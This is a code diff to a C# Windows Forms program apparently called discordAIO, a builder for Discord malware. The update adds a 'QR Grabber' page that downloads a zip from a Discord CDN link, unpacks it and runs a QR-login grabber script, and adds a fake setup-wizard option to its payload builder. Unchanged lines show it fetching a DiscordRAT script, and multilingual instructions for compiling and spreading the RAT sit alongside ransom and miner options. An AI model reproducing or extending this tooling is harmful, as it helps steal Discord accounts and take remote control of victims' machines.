@@ -6,8 +6,10 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Drawing2D;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
+using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
@@ -17,13 +19,14 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using DiscordRPC;
 using Leaf.xNet;
+using Microsoft.Win32;
 using ScintillaNET;
 
 namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.6.2";
+        private static string version = "0.6.3";
 
         public DiscordRpcClient dc_client;
 
@@ -55,6 +58,8 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
+            qrButton.Hide();
 
             usernameLabel.Text = Environment.UserName;
             versionLabel.Text = version;
@@ -99,20 +104,25 @@ namespace discordAIO6
             if (!Directory.Exists(aioDir))
             {
                 Directory.CreateDirectory(aioDir);
+                Directory.CreateDirectory(aioDir + "\\QRGrabber");
                 try
                 {
                     new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
                     new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
+                    File.Delete(aioDir + "\\QRG.zip");
                 }
-                catch { }
+                catch {}
             }
 
             DiscordRPC();
         }
 
+        bool moving = false;
         private void dAIOmain_Load(object sender, EventArgs e)
         {
-
+            moving = true;
         }
 
         protected void DiscordRPC()
@@ -164,6 +174,8 @@ namespace discordAIO6
         private readonly RandomCharacters randomCharacters_0;
         private readonly RandomInfo randomFileInfo_0;
 
+        private int pageNow = 1;
+
         public const int WM_NCLBUTTONDOWN = 0xA1;
         public const int HT_CAPTION = 0x2;
 
@@ -193,6 +205,7 @@ namespace discordAIO6
             pnlNav.Left = btnDashboard.Left;
             btnDashboard.BackColor = Color.FromArgb(11, 11, 11);
 
+
             navLabel.Text = lmain;
 
             mainSite.Show();
@@ -202,6 +215,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void btnInventory_Click(object sender, EventArgs e)
@@ -213,6 +227,7 @@ namespace discordAIO6
 
             navLabel.Text = additional;
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Hide();
             inspectorSite.Hide();
@@ -220,6 +235,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void btnWork_Click(object sender, EventArgs e)
@@ -231,6 +247,7 @@ namespace discordAIO6
 
             navLabel.Text = inspector;
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             settingsSite.Hide();
             inspectorSite.Show();
             additionalSite.Hide();
@@ -238,6 +255,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void btnMap_Click(object sender, EventArgs e)
@@ -249,6 +267,7 @@ namespace discordAIO6
 
             navLabel.Text = misc;
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Hide();
             additionalSite.Hide();
@@ -256,6 +275,7 @@ namespace discordAIO6
             miscSite.Show();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void btnParty_Click(object sender, EventArgs e)
@@ -267,6 +287,7 @@ namespace discordAIO6
 
             navLabel.Text = lminer;
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Hide();
             additionalSite.Hide();
@@ -274,6 +295,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Show();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void ratButton_Click(object sender, EventArgs e)
@@ -285,6 +307,7 @@ namespace discordAIO6
 
             navLabel.Text = "Discord RAT";
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Hide();
             additionalSite.Hide();
@@ -292,6 +315,7 @@ namespace discordAIO6
             miscSite.Hide();
             minerSite.Hide();
             ratSite.Show();
+            qrSite.Hide();
         }
 
         private void btnSettings_Click(object sender, EventArgs e)
@@ -303,6 +327,7 @@ namespace discordAIO6
 
             navLabel.Text = settings;
 
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
             mainSite.Hide();
             settingsSite.Show();
             miscSite.Hide();
@@ -310,6 +335,7 @@ namespace discordAIO6
             inspectorSite.Hide();
             minerSite.Hide();
             ratSite.Hide();
+            qrSite.Hide();
         }
 
         private void ratButton_Leave(object sender, EventArgs e)
@@ -595,6 +621,21 @@ namespace discordAIO6
             saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
             nitroBox.ForeColor = Color.DarkRed;
             cmdBox.ForeColor = Color.DarkRed;
+            page1.ForeColor = Color.DarkRed;
+            page2.ForeColor = Color.DarkRed;
+            label47.ForeColor = Color.DarkRed;
+            minimizeBtn.ForeColor = Color.DarkRed;
+            fixButton.ForeColor = Color.DarkRed;
+            qrButton.ForeColor = Color.DarkRed;
+            label50.ForeColor = Color.DarkRed;
+            label46.ForeColor = Color.DarkRed;
+            label51.ForeColor = Color.DarkRed;
+            qrStartBtn.ForeColor = Color.DarkRed;
+            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
+            button7.ForeColor = Color.DarkRed;
+            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
+            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -830,6 +871,21 @@ namespace discordAIO6
             saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
             nitroBox.ForeColor = Color.LimeGreen;
             cmdBox.ForeColor = Color.LimeGreen;
+            page1.ForeColor = Color.LimeGreen;
+            page2.ForeColor = Color.LimeGreen;
+            label47.ForeColor = Color.LimeGreen;
+            minimizeBtn.ForeColor = Color.LimeGreen;
+            fixButton.ForeColor = Color.LimeGreen;
+            qrButton.ForeColor = Color.LimeGreen;
+            label50.ForeColor = Color.LimeGreen;
+            label46.ForeColor = Color.LimeGreen;
+            label51.ForeColor = Color.LimeGreen;
+            qrStartBtn.ForeColor = Color.LimeGreen;
+            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
+            button7.ForeColor = Color.LimeGreen;
+            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
+            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
 
         }
 
@@ -1066,6 +1122,21 @@ namespace discordAIO6
             saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
             nitroBox.ForeColor = Color.DodgerBlue;
             cmdBox.ForeColor = Color.DodgerBlue;
+            page1.ForeColor = Color.DodgerBlue;
+            page2.ForeColor = Color.DodgerBlue;
+            label47.ForeColor = Color.DodgerBlue;
+            minimizeBtn.ForeColor = Color.DodgerBlue;
+            fixButton.ForeColor = Color.DodgerBlue;
+            qrButton.ForeColor = Color.DodgerBlue;
+            label50.ForeColor = Color.DodgerBlue;
+            label46.ForeColor = Color.DodgerBlue;
+            label51.ForeColor = Color.DodgerBlue;
+            qrStartBtn.ForeColor = Color.DodgerBlue;
+            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
+            button7.ForeColor = Color.DodgerBlue;
+            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
+            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -1301,6 +1372,21 @@ namespace discordAIO6
             saveButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
             nitroBox.ForeColor = Color.Gainsboro;
             cmdBox.ForeColor = Color.Gainsboro;
+            page1.ForeColor = Color.Gainsboro;
+            page2.ForeColor = Color.Gainsboro;
+            label47.ForeColor = Color.Gainsboro;
+            minimizeBtn.ForeColor = Color.Gainsboro;
+            fixButton.ForeColor = Color.Gainsboro;
+            qrButton.ForeColor = Color.Gainsboro;
+            label50.ForeColor = Color.Gainsboro;
+            label46.ForeColor = Color.Gainsboro;
+            label51.ForeColor = Color.Gainsboro;
+            qrStartBtn.ForeColor = Color.Gainsboro;
+            qrStartBtn.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            qrStartBtn.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
+            button7.ForeColor = Color.Gainsboro;
+            button7.FlatAppearance.MouseDownBackColor = Color.FromArgb(200, 200, 200);
+            button7.FlatAppearance.MouseOverBackColor = Color.FromArgb(190, 190, 190);
         }
 
         private string ynBtn = "yes";
@@ -1489,7 +1575,7 @@ namespace discordAIO6
         string compilerat = "Compile RAT";
         string linsert = "Insert";
         string instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";
-
+        string saveB = "Save";
 
 
         private void refreshLanguage()
@@ -1591,6 +1677,7 @@ namespace discordAIO6
             insertButton.Text = linsert;
             label45.Text = compilerat;
             ratCompileButton.Text = compile;
+            saveButton.Text = saveB;
         }
 
 
@@ -1723,7 +1810,7 @@ namespace discordAIO6
             compilerat = "Compile RAT";
             linsert = "Insert";
             instruction2 = "1. Create discord bot, add it to your server (with administrator privileges).\n2. Install python3.\n3. Click install button.\n4. Insert discord bot token and press Insert button.\n5. Click compile rat button.\n6. Upload compiled rat to website/discord.\n7. Provide url of compiled rat into.\n8. Check Discord RAT in additional page.\n\nCommands are on our discord server.\nIf you cannot compile RAT, uninstall enum34 package with <py -m pip uninstall enum34>";
-
+            saveB = "Save";
 
             refreshLanguage();
         }
@@ -1857,6 +1944,7 @@ namespace discordAIO6
             compilerat = "Компиляция RAT";
             linsert = "Вставлять";
             instruction2 = "1. Создайте дискорд-бота, добавьте его на свой сервер (с правами администратора).\n2. Установите питон3.\n3. Нажмите кнопку «Установить».\n4. Вставьте токен бота раздора и нажмите кнопку Вставить.\n5. Нажмите кнопку «Скомпилировать крысу».\n6. Загрузить скомпилированную крысу на сайт/дискорд.\n7. Укажите URL-адрес скомпилированного файла rat в.\n8. Проверьте Discord RAT на дополнительной странице.\n\nКоманды находятся на нашем сервере discord.\nЕсли вы не можете скомпилировать RAT, удалите пакет enum34 с помощью <py -m pip uninstall enum34>";
+            saveB = "Сохранять";
 
             refreshLanguage();
         }
@@ -1990,6 +2078,7 @@ namespace discordAIO6
             compilerat = "Compiler RAT";
             linsert = "Insérer";
             instruction2 = "1. Créez un bot Discord, ajoutez-le à votre serveur (avec des privilèges d'administrateur).\n2. Installez python3.\n3. Cliquez sur le bouton d'installation.\n4. Insérez le jeton du bot Discord et appuyez sur le bouton Insérer.\n5. Cliquez sur le bouton compiler rat.\n6. Téléchargez le rat compilé sur le site Web/discord.\n7. Fournissez l'URL du rat compilé dans.\n8. Vérifiez Discord RAT dans une page supplémentaire.\n\nLes commandes sont sur notre serveur Discord.\nSi vous ne pouvez pas compiler RAT, désinstallez le package enum34 avec <py -m pip uninstall enum34>";
+            saveB = "Sauvegarder";
 
             refreshLanguage();
         }
@@ -2123,6 +2212,7 @@ namespace discordAIO6
             compilerat = "Kompiluj RAT";
             linsert = "Wstaw";
             instruction2 = "1. Utwórz bota Discord, dodaj go do swojego serwera (z uprawnieniami administratora).\n2. Zainstaluj Pythona3.\n3. Kliknij przycisk instalacji.\n4. Wstaw token bota Discord i naciśnij przycisk Wstaw.\n5. Kliknij przycisk kompilacji RAT.\n6. Prześlij skompilowany RAT do witryny/discord.\n7. Podaj adres URL skompilowanego RAT.\n8. Zaznacz Discord RAT na dodatkowej stronie.\n\nPolecenia są na naszym serwerze Discord.\nJeśli nie możesz skompilować RAT, odinstaluj pakiet enum34 za pomocą <py -m pip uninstall enum34>";
+            saveB = "Zapisz";
 
             refreshLanguage();
         }
@@ -2256,6 +2346,7 @@ namespace discordAIO6
             compilerat = "Compilar RAT";
             linsert = "Insertar";
             instruction2 = "1. Cree un bot de discord, agréguelo a su servidor (con privilegios de administrador).\n2. Instale python3.\n3. Haga clic en el botón de instalación.\n4. Inserte el token del bot de discordia y presione el botón Insertar.\n5. Haga clic en el botón compilar rat.\n6. Cargue la rata compilada en el sitio web/discord.\n7. Proporcione la URL de la rata compilada en.\n8. Compruebe Discord RAT en la página adicional.\n\nLos comandos están en nuestro servidor de discordia.\nSi no puede compilar RAT, desinstale el paquete enum34 con <py -m pip uninstall enum34>";
+            saveB = "Salvar";
 
             refreshLanguage();
         }
@@ -2389,6 +2480,7 @@ namespace discordAIO6
             compilerat = "Derlemek RAT";
             linsert = "Sokmak";
             instruction2 = "1. Discord botu oluşturun, sunucunuza ekleyin (yönetici ayrıcalıklarıyla).\n2. python3'ü yükleyin.\n3. Yükle düğmesini tıklayın.\n4. Discord bot jetonunu yerleştirin ve Ekle düğmesine basın.\n5. Derleme fare düğmesini tıklayın.\n6. Derlenmiş fareyi web sitesine/discord'a yükleyin.\n7. Derlenmiş farenin URL'sini girin.\n8. Ek sayfada Discord RAT'ı kontrol edin.\n\nKomutlar discord sunucumuzda.\nRAT derleyemiyorsanız, enum34 paketini <py -m pip uninstall enum34> ile kaldırın";
+            saveB = "Kayıt etmek";
 
             refreshLanguage();
         }
@@ -2669,6 +2761,11 @@ namespace discordAIO6
                             {
                                 text = text.Replace("//ourcoolfakecmd", "RunFAKEcmd();");
                             }
+                            if (wizardBox.Checked)
+                            {
+                                text = text.Replace("//ourcoolfakesetup", "RunWizard();");
+                            }
+
 
                             // Ransom
                             if (ransomBox.Checked)
@@ -3414,6 +3511,199 @@ namespace discordAIO6
             Properties.Settings.Default["ui_Color"] = cButton;
             Properties.Settings.Default["show_Username"] = ynBtn;
             Properties.Settings.Default.Save();
+            PopupMessage("Settings saved.");
+        }
+
+        private void dAIOmain_Move(object sender, EventArgs e)
+        {
+            if (moving)
+            {
+                this.Opacity = 0.5;
+            }
+        }
+
+        Font smallOne = new Font("Poppins", 7, FontStyle.Regular);
+        Font biggerOne = new Font("Poppins Medium", 7, FontStyle.Bold);
+
+        private void dAIOmain_ResizeEnd(object sender, EventArgs e)
+        {
+            this.Opacity = 1;
+        }
+
+        private void page1_Click(object sender, EventArgs e)
+        {
+            page1.Font = biggerOne;
+            page2.Font = smallOne;
+            pageNow = 1;
+
+            btnDashboard.Show();
+            ratButton.Show();
+            btnParty.Show();
+            btnMap.Show();
+            btnWork.Show();
+            btnInventory.Show();
+
+            qrButton.Hide();
+            pnlNav.Height = btnDashboard.Height;
+            pnlNav.Top = btnDashboard.Top;
+            pnlNav.Left = btnDashboard.Left;
+            btnDashboard.BackColor = Color.FromArgb(11, 11, 11);
+
+            navLabel.Text = lmain;
+
+            qrSite.Hide();
+            settingsSite.Hide();
+            additionalSite.Hide();
+            inspectorSite.Hide();
+            miscSite.Hide();
+            minerSite.Hide();
+            ratSite.Hide();
+            mainSite.Show();
+            qrButton.BackColor = Color.FromArgb(8, 8, 8);
+            ratButton.BackColor = Color.FromArgb(8, 8, 8);
+            btnParty.BackColor = Color.FromArgb(8, 8, 8);
+            btnWork.BackColor = Color.FromArgb(8, 8, 8);
+            btnInventory.BackColor = Color.FromArgb(8, 8, 8);
+            btnMap.BackColor = Color.FromArgb(8, 8, 8);
+            btnSettings.BackColor = Color.FromArgb(8, 8, 8);
+        }
+
+        private void page2_Click(object sender, EventArgs e)
+        {
+            page2.Font = biggerOne;
+            page1.Font = smallOne;
+            pageNow = 2;
+
+            btnDashboard.Hide();
+            ratButton.Hide();
+            btnParty.Hide();
+            btnMap.Hide();
+            btnWork.Hide();
+            btnInventory.Hide();
+
+            qrButton.Show();
+
+
+
+            pnlNav.Height = qrButton.Height;
+            pnlNav.Top = qrButton.Top;
+            pnlNav.Left = qrButton.Left;
+            qrButton.BackColor = Color.FromArgb(11, 11, 11);
+
+            ratButton.BackColor = Color.FromArgb(8, 8, 8);
+            btnDashboard.BackColor = Color.FromArgb(8, 8, 8);
+            btnParty.BackColor = Color.FromArgb(8, 8, 8);
+            btnWork.BackColor = Color.FromArgb(8, 8, 8);
+            btnInventory.BackColor = Color.FromArgb(8, 8, 8);
+            btnMap.BackColor = Color.FromArgb(8, 8, 8);
+            btnSettings.BackColor = Color.FromArgb(8, 8, 8);
+
+            navLabel.Text = "QR Grabber";
+
+            mainSite.Hide();
+            settingsSite.Hide();
+            additionalSite.Hide();
+            inspectorSite.Hide();
+            miscSite.Hide();
+            minerSite.Hide();
+            ratSite.Hide();
+            qrSite.Show();
+
+        }
+
+        private void qrButton_Leave(object sender, EventArgs e)
+        {
+            qrButton.BackColor = Color.FromArgb(8, 8, 8);
+        }
+
+        private void qrButton_Click(object sender, EventArgs e)
+        {
+            pnlNav.Height = qrButton.Height;
+            pnlNav.Top = qrButton.Top;
+            pnlNav.Left = qrButton.Left;
+            qrButton.BackColor = Color.FromArgb(11, 11, 11);
+
+            navLabel.Text = "QR Grabber";
+
+            mainSite.Hide();
+            settingsSite.Hide();
+            additionalSite.Hide();
+            inspectorSite.Hide();
+            miscSite.Hide();
+            minerSite.Hide();
+            ratSite.Hide();
+            qrSite.Show();
+        }
+
+        private void minimizeBtn_Click(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Minimized;
+        }
+
+        // Installation
+        private void button7_Click(object sender, EventArgs e)
+        {
+            bool amIhere = checkIfPythonIsInstalled();
+            if (amIhere)
+            {
+                // REQUIREMENTS
+                Process requreInstall = new Process();
+                requreInstall.StartInfo.FileName = @"cmd.exe";
+                requreInstall.StartInfo.WorkingDirectory = aioDir + "\\QRGrabber";
+                requreInstall.StartInfo.Arguments = "/C py -m pip install -r requirements.txt";
+                requreInstall.StartInfo.UseShellExecute = true;
+                requreInstall.Start();
+                requreInstall.WaitForExit();
+
+                PopupMessage("All dependencies were installed.");
+            }
+            else
+                PopupMessage("You need to install python first!\nOr the wrong version is installed.");
+        }
+
+        private void qrStartBtn_Click(object sender, EventArgs e)
+        {
+            Process requreInstall = new Process();
+            requreInstall.StartInfo.FileName = @"cmd.exe";
+            requreInstall.StartInfo.WorkingDirectory = aioDir + "\\QRGrabber";
+            requreInstall.StartInfo.Arguments = "/K py QR_Generator.py";
+            requreInstall.StartInfo.UseShellExecute = false;
+            requreInstall.Start();
+            requreInstall.WaitForExit();
+        }
+
+        private void fixButton_Click(object sender, EventArgs e)
+        {
+            if (!Directory.Exists(aioDir))
+            {
+                Directory.CreateDirectory(aioDir);
+                Directory.CreateDirectory(aioDir + "\\QRGrabber");
+                try
+                {
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
+                    File.Delete(aioDir + "\\QRG.zip");
+                }
+                catch { }
+            }
+            else
+            {
+                var dir = new DirectoryInfo(aioDir);
+                dir.Delete(true);
+                Directory.CreateDirectory(aioDir);
+                Directory.CreateDirectory(aioDir + "\\QRGrabber");
+                try
+                {
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
+                    File.Delete(aioDir + "\\QRG.zip");
+                }
+                catch { }
+            }
         }
     }
 }
